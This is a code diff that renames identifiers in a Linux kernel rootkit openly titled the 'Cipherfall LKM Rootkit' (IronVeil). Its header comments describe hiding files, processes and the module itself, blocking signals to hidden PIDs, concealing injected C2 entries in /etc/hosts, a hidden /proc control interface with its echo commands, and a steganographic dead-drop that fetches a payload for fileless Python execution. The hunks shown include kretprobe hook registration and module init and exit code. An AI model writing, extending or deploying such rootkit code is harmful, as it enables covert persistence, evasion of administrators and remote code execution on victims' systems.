@@ -1,11 +1,11 @@
 /*
- * IronVeil (rootkit.c) — Cipherfall LKM Rootkit
+ * IronVeil (ironveil.c) — Cipherfall LKM Rootkit
  *
  * Capabilities:
  *   - Hides files and directories whose names start with HIDE_FILE_PREFIX
- *     ("rootkit_" by default) from any getdents64 directory listing.
+ *     ("ironveil_" by default) from any getdents64 directory listing.
  *   - Hides additional files or directories by exact name, managed at runtime
- *     via the /proc/rootkit_ctrl write-only control interface.
+ *     via the /proc/ironveil_ctrl write-only control interface.
  *   - Hides processes by PID: numeric entries in /proc/ are removed from
  *     directory listings and any signal to those PIDs returns -ESRCH.
  *   - Self-hides at init: removes itself from the module linked list (lsmod,
@@ -36,11 +36,11 @@
  *   __x64_sys_read        — filters lines containing HOSTS_MARKER from reads
  *                           of /etc/hosts, hiding the injected C2 entries.
  *
- * Control interface (/proc/rootkit_ctrl — write-only, itself hidden):
- *   echo "hide_pid <PID>"     > /proc/rootkit_ctrl
- *   echo "unhide_pid <PID>"   > /proc/rootkit_ctrl
- *   echo "hide_file <name>"   > /proc/rootkit_ctrl
- *   echo "unhide_file <name>" > /proc/rootkit_ctrl
+ * Control interface (/proc/ironveil_ctrl — write-only, itself hidden):
+ *   echo "hide_pid <PID>"     > /proc/ironveil_ctrl
+ *   echo "unhide_pid <PID>"   > /proc/ironveil_ctrl
+ *   echo "hide_file <name>"   > /proc/ironveil_ctrl
+ *   echo "unhide_file <name>" > /proc/ironveil_ctrl
  *
  * Dead-drop resolver (stego PNG → payload URL → fileless Python exec):
  *   On init, a kernel delayed_work fires after 5 seconds and calls
@@ -122,8 +122,8 @@ MODULE_AUTHOR("Cipherfall");
 MODULE_DESCRIPTION("Cipherfall LKM Rootkit");
 MODULE_VERSION("1.0");
 
-#define HIDE_FILE_PREFIX  "rootkit_"
-#define CTRL_PROC_NAME    "rootkit_ctrl"
+#define HIDE_FILE_PREFIX  "ironveil_"
+#define CTRL_PROC_NAME    "ironveil_ctrl"
 #define MAX_HIDDEN_PIDS   64
 #define MAX_HIDDEN_FILES  64
 #define MAX_FILENAME_LEN  256
@@ -543,7 +543,7 @@ static struct kretprobe rp_kill = {
 	.maxactive      = KRP_MAXACTIVE,
 };
 
-/* ── /proc/rootkit_ctrl write interface ───────────────────────────────────── */
+/* ── /proc/ironveil_ctrl write interface ───────────────────────────────────── */
 static ssize_t ctrl_write(struct file *file, const char __user *buf,
                           size_t count, loff_t *ppos)
 {
@@ -641,13 +641,13 @@ static void do_payload_fetch(struct work_struct *work)
 }
 
 /* ── module init / exit ───────────────────────────────────────────────────── */
-static int __init rootkit_init(void)
+static int __init ironveil_init(void)
 {
 	int rc;
 
 #ifdef USE_KPROBES_KALLSYMS
 	if (resolve_kallsyms() < 0) {
-		pr_err("rootkit: kprobe lookup for kallsyms_lookup_name failed\n");
+		pr_err("ironveil: kprobe lookup for kallsyms_lookup_name failed\n");
 		return -EINVAL;
 	}
 #endif
@@ -656,20 +656,20 @@ static int __init rootkit_init(void)
 
 	rc = register_kretprobe(&rp_read);
 	if (rc < 0) {
-		pr_err("rootkit: register rp_read failed: %d\n", rc);
+		pr_err("ironveil: register rp_read failed: %d\n", rc);
 		return rc;
 	}
 
 	rc = register_kretprobe(&rp_gd64);
 	if (rc < 0) {
-		pr_err("rootkit: register rp_gd64 failed: %d\n", rc);
+		pr_err("ironveil: register rp_gd64 failed: %d\n", rc);
 		unregister_kretprobe(&rp_read);
 		return rc;
 	}
 
 	rc = register_kretprobe(&rp_kill);
 	if (rc < 0) {
-		pr_err("rootkit: register rp_kill failed: %d\n", rc);
+		pr_err("ironveil: register rp_kill failed: %d\n", rc);
 		unregister_kretprobe(&rp_gd64);
 		unregister_kretprobe(&rp_read);
 		return rc;
@@ -689,7 +689,7 @@ static int __init rootkit_init(void)
 	return 0;
 }
 
-static void __exit rootkit_exit(void)
+static void __exit ironveil_exit(void)
 {
 	cancel_delayed_work_sync(&fetch_work);
 	unregister_kretprobe(&rp_kill);
@@ -698,5 +698,5 @@ static void __exit rootkit_exit(void)
 	remove_proc_entry(CTRL_PROC_NAME, NULL);
 }
 
-module_init(rootkit_init);
-module_exit(rootkit_exit);
+module_init(ironveil_init);
+module_exit(ironveil_exit);
